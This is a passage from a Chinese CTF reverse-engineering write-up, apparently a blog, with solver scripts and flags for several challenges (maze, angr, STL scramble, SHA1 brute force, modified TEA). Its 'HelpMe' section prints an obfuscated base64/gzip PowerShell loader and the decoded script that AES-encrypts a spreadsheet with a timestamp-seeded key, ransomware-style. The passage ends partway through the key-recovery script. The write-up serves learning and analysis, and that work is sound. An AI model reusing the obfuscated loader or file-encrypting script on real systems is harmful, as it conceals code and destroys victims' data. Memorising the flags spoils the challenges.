src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132205962.png" alt="image-20221005230455193"></p><p>大概就长这样</p><div class="table-container"><table><thead><tr><th>#</th><th>#</th><th>#</th><th>#</th><th>#</th><th>#</th><th>#</th><th>#</th><th>#</th><th>#</th><th>#</th><th>#</th><th>#</th><th>#</th><th>#</th><th>#</th></tr></thead><tbody><tr><td>#</td><td>*</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>#</td><td></td><td></td><td></td><td></td><td>#</td></tr><tr><td>#</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>#</td></tr><tr><td>#</td><td></td><td></td><td></td><td></td><td>#</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>#</td></tr><tr><td>#</td><td>#</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>#</td></tr><tr><td>#</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>#</td><td></td><td></td><td></td><td></td><td>#</td><td>#</td></tr><tr><td>#</td><td></td><td></td><td></td><td>#</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>#</td></tr><tr><td>#</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>#</td></tr><tr><td>#</td><td></td><td></td><td></td><td></td><td>#</td><td></td><td></td><td></td><td></td><td></td><td></td><td>#</td><td></td><td>O</td><td>#</td></tr><tr><td>#</td><td>#</td><td>#</td><td>#</td><td>#</td><td>#</td><td>#</td><td>#</td><td>#</td><td>#</td><td>#</td><td>#</td><td>#</td><td>#</td><td>#</td><td>#</td></tr></tbody></table></div><p>走法不唯一，题目要求的是最短的一条</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132205963.png" alt="image-20221005230823504"></p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132205964.png" alt="image-20221005230831060"></p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;f71516bdf07abd7bc0668db9d6352364&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>        <h2 id="Annnnnnggrr"   >          <a href="#Annnnnnggrr" class="heading-link"><i class="fas fa-link"></i></a><a href="#Annnnnnggrr" class="headerlink" title="Annnnnnggrr"></a>Annnnnnggrr</h2>      <p>本题主要考察angr的使用</p><p>ida无壳</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132205965.png" alt="image-20221014225958996"></p><p><del>大哥爬楼梯</del></p><p>没什么好说的，基本上就是对着angr的模板写就行</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&quot;./Annnnnggrr.exe&quot;</span>, auto_load_libs=<span class="literal">False</span>)</span><br><span class="line">star = <span class="number">0x140001103</span> <span class="comment"># 跳过输入</span></span><br><span class="line">state = proj.factory.blank_state(addr=star)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">password = claripy.BVS(<span class="string">&quot;password&quot;</span>, <span class="number">32</span> * <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ans = <span class="number">0x140005640</span></span><br><span class="line">state.memory.store(ans, password)</span><br><span class="line"></span><br><span class="line">simg = proj.factory.simulation_manager(state)</span><br><span class="line">check_addr = <span class="number">0x14000248A</span></span><br><span class="line">simg.explore(find = check_addr)</span><br><span class="line"></span><br><span class="line">key = [<span class="number">0x4F</span>, <span class="number">0x17</span>, <span class="number">0x0C</span>, <span class="number">0x56</span>, <span class="number">0xDB</span>, <span class="number">0x67</span>, <span class="number">0x5D</span>, <span class="number">0x67</span>,</span><br><span class="line">       <span class="number">0x32</span>, <span class="number">0x2B</span>, <span class="number">0x36</span>, <span class="number">0x03</span>, <span class="number">0x02</span>, <span class="number">0xF3</span>, <span class="number">0xA1</span>, <span class="number">0xE4</span>,</span><br><span class="line">       <span class="number">0xC7</span>, <span class="number">0x27</span>, <span class="number">0xC1</span>, <span class="number">0xB6</span>, <span class="number">0x4C</span>, <span class="number">0xD7</span>, <span class="number">0x59</span>, <span class="number">0xA1</span>,</span><br><span class="line">       <span class="number">0x71</span>, <span class="number">0x52</span>, <span class="number">0x9A</span>, <span class="number">0xE2</span>, <span class="number">0x21</span>, <span class="number">0x96</span>, <span class="number">0x0C</span>, <span class="number">0xCA</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> simg.found:</span><br><span class="line">    check_state = simg.found[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        ch = check_state.memory.load(ans + i, <span class="number">1</span>)</span><br><span class="line">        check_state.solver.add(ch == key[i]) <span class="comment"># 添加约束条件</span></span><br><span class="line"></span><br><span class="line">    sol = check_state.solver.<span class="built_in">eval</span>(password, cast_to=<span class="built_in">bytes</span>)</span><br><span class="line">    <span class="built_in">print</span>(sol)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Not Solution&quot;</span>)</span><br></pre></td></tr></table></div></figure><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;umm_I_can&#x27;t_calc_1t_@t_all&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="funnyOTL-1"   >          <a href="#funnyOTL-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#funnyOTL-1" class="headerlink" title="funnyOTL_1"></a>funnyOTL_1</h2>      <p>ida64位</p><p>这题主要是对c++的库函数的熟悉度</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132205966.png" alt="image-20221014230455452"></p><p>输入<code>flag&#123;&#125;</code>包裹的总长为24位的密码</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132205967.png" alt="image-20221014230607425"></p><p>然后就是加密后交换，唯一问题是这个随机数的问题，经过测试，Linux环境下随机数的值和Windows下是不一样的，以后要注意系统之间的差异</p><p>写脚本</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">enc =[ <span class="number">76</span>, <span class="number">171</span>, <span class="number">120</span>,  <span class="number">73</span>, <span class="number">104</span>, <span class="number">157</span>,  <span class="number">81</span>, <span class="number">121</span>, <span class="number">117</span>,  <span class="number">95</span>,</span><br><span class="line">    <span class="number">125</span>, <span class="number">197</span>,  <span class="number">99</span>,  <span class="number">82</span>,  <span class="number">76</span>, <span class="number">180</span>,  <span class="number">79</span>, <span class="number">123</span>, <span class="number">103</span>,  <span class="number">97</span>,</span><br><span class="line">    <span class="number">111</span>, <span class="number">110</span>, <span class="number">107</span>,  <span class="number">95</span>]</span><br><span class="line"></span><br><span class="line">key = [<span class="number">0x12</span>,<span class="number">0x6</span>,<span class="number">0x8</span>,<span class="number">0xa</span>,<span class="number">0x6</span>,<span class="number">0x14</span>,<span class="number">0xa</span>,<span class="number">0x14</span>,<span class="number">0</span>,<span class="number">0xc</span>,<span class="number">0x2</span>,<span class="number">0x4</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    sec1 = enc[i*<span class="number">2</span>]</span><br><span class="line">    sec2 = enc[i*<span class="number">2</span>+<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    fir1 = enc[key[i]]</span><br><span class="line">    fir2 = enc[key[i] + <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    fir1 = fir1 ^ key[i]</span><br><span class="line">    fir2 = (~fir2) ^ key[i]</span><br><span class="line"></span><br><span class="line">    enc[i*<span class="number">2</span>] = fir1</span><br><span class="line">    enc[i*<span class="number">2</span>+<span class="number">1</span>] = fir2</span><br><span class="line"></span><br><span class="line">    enc[key[i]] = sec1</span><br><span class="line">    enc[key[i] + <span class="number">1</span>] = sec2</span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">    s = <span class="built_in">chr</span>(i &amp; <span class="number">0xff</span>) + s</span><br><span class="line"><span class="built_in">print</span>(s)</span><br></pre></td></tr></table></div></figure><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;OTL_n0w_u_know_STL&#125;</span><br></pre></td></tr></table></div></figure>        <h1 id="Week4"   >          <a href="#Week4" class="heading-link"><i class="fas fa-link"></i></a><a href="#Week4" class="headerlink" title="Week4"></a>Week4</h1>              <h2 id="Hash"   >          <a href="#Hash" class="heading-link"><i class="fas fa-link"></i></a><a href="#Hash" class="headerlink" title="Hash"></a>Hash</h2>      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">enc = [</span><br><span class="line">    <span class="string">&#x27;a2f17ed1c6a8bc31769cdf654df4b8a937042cb6&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0ca8a2edb0c1d34a432a5a4464e0d6abd847c831&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;c359d69f3f08bb920f2c3b51133205533462093e&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;cc5c3fe6e7356a26a134cff5633349f597c40a9d&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4ac4bb3f27f245ba9178651aa5cdedcbb2862e2a&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;a01e33f4dcdb6ba1ae9f34a97cf8f6deeedf1a8d&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;d3af70912a8c1b22cfdece071ba36bc4662b58fa&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;9395eab195d25b676d7d07075d3838a9ac19df21&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;fdb43c5ef76ecda0c1661d6d199b5bfac1db538a&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;da8e9997a010be78b20108ce79fec1fb9c63d8dc&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;809da627f1ad01d65864c376e3179b62d9d74261&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;8f61ee21ac7579626934e0ffb6a62b3d4a82eec4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;e2a954758fdb61f869998e9788b7b7e48480b832&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;b8e3349b97532b27aa62b8718b68240179158144&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">128</span>):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">128</span>):</span><br><span class="line">            <span class="keyword">for</span> z <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">128</span>):</span><br><span class="line">                ans = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                ans = ans + <span class="built_in">chr</span>(x&amp;<span class="number">0xff</span>) + <span class="built_in">chr</span>(y&amp;<span class="number">0xff</span>) + <span class="built_in">chr</span>(z&amp;<span class="number">0xff</span>)</span><br><span class="line">                m = hashlib.sha1()</span><br><span class="line">                m.update(ans.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">                <span class="keyword">if</span> m.hexdigest() == enc[i]:</span><br><span class="line">                    flag = flag + ans</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></div></figure><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Easy_Hash_And_Y0u_Solve_1t_Quickly!!&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="Exception"   >          <a href="#Exception" class="heading-link"><i class="fas fa-link"></i></a><a href="#Exception" class="headerlink" title="Exception"></a>Exception</h2>      <p>32位ida</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132205968.png" alt="image-20221014223810878"></p><p>乍一看只是单纯的tea，但是直接逆是解不出来的</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132205969.png" alt="image-20221014223948342"></p><p>在tea加密里面塞入了一个try块</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132205970.png" alt="image-20221014224033090"></p><p>分析异常，发现异常过滤器的返回值恒为1，即一定进入异常处理</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132205971.png" alt="image-20221014224158198"></p><p>于是直接分析异常处理</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132205972.png" alt="image-20221014224231224"></p><p>这里将delta 异或了一个0x12345678，编写脚本</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdint&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span>* EntryData, <span class="type">unsigned</span> <span class="type">long</span>* Key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> Mup = EntryData[<span class="number">0</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> Mdown = EntryData[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> delta = <span class="number">0x9E3779B9</span>;</span><br><span class="line"> <span class="type">int</span> n=<span class="number">32</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//计算delta最后的值</span></span><br><span class="line">   <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span>; j++)&#123;</span><br><span class="line">        sum += delta;</span><br><span class="line">        delta ^= <span class="number">0x12345678</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        Mdown -= ((Mup &lt;&lt; <span class="number">4</span>) + Key[<span class="number">2</span>]) ^ (Mup + sum) ^ ((Mup &gt;&gt; <span class="number">5</span>) + Key[<span class="number">3</span>]);</span><br><span class="line">        Mup -= ((Mdown &lt;&lt; <span class="number">4</span>) + Key[<span class="number">0</span>]) ^ (Mdown + sum) ^ ((Mdown &gt;&gt; <span class="number">5</span>) + Key[<span class="number">1</span>]);</span><br><span class="line">        delta ^= <span class="number">0x12345678</span>;<span class="comment">//每次循环将delta异或后再减</span></span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;</span><br><span class="line">    EntryData[<span class="number">0</span>] = Mup;</span><br><span class="line">    EntryData[<span class="number">1</span>] = Mdown;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> key[] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> flag[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">206</span>,  <span class="number">33</span>, <span class="number">232</span>, <span class="number">136</span>, <span class="number">112</span>, <span class="number">157</span>,   <span class="number">0</span>,  <span class="number">11</span>, <span class="number">143</span>, <span class="number">230</span>, </span><br><span class="line">  <span class="number">177</span>, <span class="number">145</span>, <span class="number">150</span>, <span class="number">234</span>,  <span class="number">49</span>,   <span class="number">1</span>, <span class="number">125</span>, <span class="number">157</span>,  <span class="number">32</span>, <span class="number">163</span>, </span><br><span class="line">  <span class="number">251</span>, <span class="number">125</span>,  <span class="number">24</span>, <span class="number">169</span>, <span class="number">202</span>, <span class="number">197</span>,  <span class="number">82</span>, <span class="number">196</span>,  <span class="number">83</span>, <span class="number">103</span>, </span><br><span class="line">  <span class="number">105</span>, <span class="number">169</span></span><br><span class="line">&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i+=<span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">decrypt</span>((<span class="type">unsigned</span> <span class="type">long</span> *)&amp;flag[i*<span class="number">4</span>],key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;flag[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></div></figure><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;44C3A7F112DA2BE728F451C5E2D09558&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="HelpMe"   >          <a href="#HelpMe" class="heading-link"><i class="fas fa-link"></i></a><a href="#HelpMe" class="headerlink" title="HelpMe"></a>HelpMe</h2>      <p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132205973.png" alt="image-20221011124833051"></p><p>解压后发现有一个ps1的owershell的脚本文件</p><p>题目的意思是一个excel文件被加密了</p><p>.enc是一个二进制文件，突破点在于Help.ps1脚本</p><figure class="highlight powershell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$mypath</span> = <span class="built_in">Split-Path</span> <span class="literal">-Parent</span> <span class="variable">$MyInvocation</span>.MyCommand.Definition</span><br><span class="line">&amp;([<span class="type">scriptblock</span>]::create((<span class="built_in">New-Object</span> System.IO.StreamReader(<span class="built_in">New-Object</span> System.IO.Compression.GzipStream((<span class="built_in">New-Object</span> System.IO.MemoryStream(,[<span class="type">System.Convert</span>]::FromBase64String(<span class="string">&#x27;H4sIAKxePWMA/31RT2+bMBS/8yksxAHUYCVI66RMm5TQdJq6LFXJdslycPGDeDU2wi9a0LTv3mdos2yHXZDfD//++UWoGnAompa9Z/HuRiBsCdlUlQPcxx8BU4+xsBDINiWy6Yxl0yyjzzzL5tksTBK+tV+NOnleAaU10sVJED1BT5Jf4Ge6efwBxFz2CLs9m10HXvVBGGkblq7FiWVvrllaABYAkl0k+hCZo9ZBZTsWR8pIOJHi9B17OacaSe11vLpK2C/vuhvnPd3dPZLn2OIfv+R3EC1Wxd8Ji94hNJxKHDuFPc+7vkVbd6I99HwBbi2MqEEOTH439POG47y2EggIV/kyHJF7IaUytc/xX+WXe15gP5/f3+XF2yCqlB7koqZvBR6+N32tKuQn7RqS973chfCnDb8lAtEfQMiF1v6xXRwOMiFtY2XKwbLzmX24vAPa6xn2GwNTSoHC3zjjfNsJ42gDza0yQi+1LZ/i0X7CphM2HvlnMDUeLn34jXKtdeCFvd+fkRad5tYgGGTpN6GPwM7WKfHt8Gi+ALX3+Tn9DYNn5mIx06oCAAA=&#x27;</span>))),[<span class="type">System.IO.Compression.CompressionMode</span>]::Decompress))).ReadToEnd()))</span><br></pre></td></tr></table></div></figure><p>真正的脚本应该是那段base64数据，python解密后再用gzip解压（这个是看网上那些恶意代码分析的文章看来了）</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> gzip</span><br><span class="line">text = <span class="string">&quot;H4sIAKxePWMA/31RT2+bMBS/8yksxAHUYCVI66RMm5TQdJq6LFXJdslycPGDeDU2wi9a0LTv3mdos2yHXZDfD//++UWoGnAompa9Z/HuRiBsCdlUlQPcxx8BU4+xsBDINiWy6Yxl0yyjzzzL5tksTBK+tV+NOnleAaU10sVJED1BT5Jf4Ge6efwBxFz2CLs9m10HXvVBGGkblq7FiWVvrllaABYAkl0k+hCZo9ZBZTsWR8pIOJHi9B17OacaSe11vLpK2C/vuhvnPd3dPZLn2OIfv+R3EC1Wxd8Ji94hNJxKHDuFPc+7vkVbd6I99HwBbi2MqEEOTH439POG47y2EggIV/kyHJF7IaUytc/xX+WXe15gP5/f3+XF2yCqlB7koqZvBR6+N32tKuQn7RqS973chfCnDb8lAtEfQMiF1v6xXRwOMiFtY2XKwbLzmX24vAPa6xn2GwNTSoHC3zjjfNsJ42gDza0yQi+1LZ/i0X7CphM2HvlnMDUeLn34jXKtdeCFvd+fkRad5tYgGGTpN6GPwM7WKfHt8Gi+ALX3+Tn9DYNn5mIx06oCAAA=&quot;</span></span><br><span class="line"><span class="built_in">print</span>(gzip.decompress(base64.b64decode(text)).decode())</span><br></pre></td></tr></table></div></figure><p>跑完就会出现真正的脚本</p><figure class="highlight powershell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$timestamp</span> = ([<span class="built_in">DateTime</span><span class="type">Offset</span>](<span class="built_in">Get-Date</span> <span class="string">&quot;Sat Oct 01 2022 20:22:21&quot;</span>)).ToUnixTimeSeconds()</span><br><span class="line"><span class="variable">$key</span> = <span class="built_in">New-Object</span> Byte[] <span class="number">16</span></span><br><span class="line"><span class="built_in">Get-Random</span> <span class="literal">-Max</span> <span class="number">256</span> <span class="literal">-SetSeed</span> <span class="variable">$timestamp</span> &gt;<span class="variable">$null</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$index</span> = <span class="number">0</span>; <span class="variable">$index</span> <span class="operator">-lt</span> <span class="number">16</span>; <span class="variable">$index</span>++) &#123;<span class="variable">$key</span>[<span class="variable">$index</span>] = [<span class="built_in">byte</span>](<span class="built_in">Get-Random</span> <span class="literal">-Max</span> <span class="number">256</span>)&#125;</span><br><span class="line"><span class="variable">$AES</span> = <span class="built_in">New-Object</span> System.Security.Cryptography.AesManaged</span><br><span class="line"><span class="variable">$AES</span>.Key = <span class="variable">$key</span></span><br><span class="line"><span class="variable">$AES</span>.Mode = <span class="string">&quot;ECB&quot;</span></span><br><span class="line"><span class="variable">$AES</span>.Padding = [<span class="type">System.Security.Cryptography.PaddingMode</span>]::PKCS7</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;<span class="variable">$mypath</span>\mygift.xlsm&quot;</span></span><br><span class="line"><span class="variable">$bytes</span> = [<span class="type">System.IO.File</span>]::ReadAllBytes(<span class="string">&quot;<span class="variable">$file</span>&quot;</span>)</span><br><span class="line"><span class="variable">$Encryptor</span> = <span class="variable">$AES</span>.CreateEncryptor()</span><br><span class="line"><span class="variable">$encdata</span> = <span class="variable">$Encryptor</span>.TransformFinalBlock(<span class="variable">$bytes</span>, <span class="number">0</span>, <span class="variable">$bytes</span>.Length)</span><br><span class="line"><span class="variable">$Encryptor</span>.Dispose()</span><br><span class="line"><span class="variable">$AES</span>.Dispose()</span><br><span class="line"><span class="built_in">Set-Content</span> <span class="literal">-Value</span> <span class="variable">$encdata</span> <span class="literal">-Encoding</span> Byte <span class="string">&quot;<span class="variable">$file</span>.enc&quot;</span></span><br></pre></td></tr></table></div></figure><p>首先用<code>Sat Oct 01 2022 20:22:21</code>生成16位随机数，然后再AES的ECB模式加密文件</p><p>首先写脚本，用powershell跑出key</p><figure class="highlight powershell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$timestamp</span> = ([<span class="built_in">DateTime</span><span class="type">Offset</span>](<span class="built_in">Get-Date</span> <span class="string">&quot;Sat Oct 01 2022 20:22:21&quot;</span>)).ToUnixTimeSeconds()</span><br><span class="line"><span class="variable">$key</span> = <span class="built_in">New-Object</span> Byte[] <span class="number">16</span></span><br><span class="line"><span class="built_in">Get-Random</span> <span class="literal">-Max</span> <span class="number">256</span> <span class="literal">-SetSeed</span> <span class="variable">$timestamp</span> &gt;<span class="variable">$null</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$index</span> = <span class="number">0</span>; <span class="variable">$index</span> <span class="operator">-lt</span> <span class="number">16</span>; <span class="variable">$index</span>++) &#123;<span class="variable">$key</span>[<span class="variable">$index</span>] = [<span class="built_in">byte</span>](<span class="built_in">Get-Random</span> <span class="literal">-Max</span> 